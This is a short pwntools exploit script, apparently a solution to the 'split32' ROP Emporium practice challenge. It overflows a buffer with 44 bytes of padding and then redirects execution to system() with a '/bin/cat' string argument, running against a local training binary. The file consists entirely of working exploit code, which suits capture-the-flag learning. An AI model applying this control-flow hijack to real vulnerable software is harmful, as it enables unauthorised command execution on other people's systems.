#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('split32')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

system  = 0x080483e0
bin_cat = 0x804a030

pay = b'A' * 44
pay += p32(system)
pay += p32(0x0)
pay += p32(bin_cat)

io = start()
io.clean()
io.sendline(pay)
io.interactive()

